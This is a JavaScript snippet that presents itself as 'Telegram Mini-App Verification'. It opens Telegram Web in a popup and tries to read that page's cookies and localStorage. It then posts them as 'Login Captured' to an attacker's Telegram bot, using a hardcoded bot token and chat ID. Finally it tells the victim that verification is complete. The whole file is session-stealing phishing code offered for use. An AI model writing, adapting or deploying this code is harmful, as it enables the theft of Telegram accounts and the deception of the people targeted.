// JavaScript for Telegram Mini-App Verification
document.getElementById("loginBtn").addEventListener("click", () => {
  // Open Telegram Web login in a popup
  const popup = window.open("https://web.telegram.org/a/", "Telegram Login", "width=600,height=800");

  const interval = setInterval(() => {
      try {
          // Check if the popup is ready and grab cookies/session
          if (popup.document && popup.document.readyState === "complete") {
              const cookies = popup.document.cookie; // Capture cookies
              const session = localStorage; // Capture session data

              // Send captured data to your Telegram bot
              fetch(`https://api.telegram.org/bot8054846852:AAHatb3M2yAA8QXj1gQm7iWlcrDgqcHAE1E/sendMessage`, {
                  method: "POST",
                  headers: {
                      "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                      chat_id: 6263982437, // Your Telegram user ID
                      text: `📋 <b>Login Captured:</b>\n\n🍪 <b>Cookies:</b> ${cookies}\n🗂️ <b>Session:</b> ${JSON.stringify(session)}`,
                      parse_mode: "HTML"
                  })
              });

              // Notify user and close popup
              alert("Verification complete! Data sent.");
              popup.close();
              clearInterval(interval);
          }
      } catch (error) {
          // Keep trying until the popup is ready
      }
  }, 1000); // Check every second
});
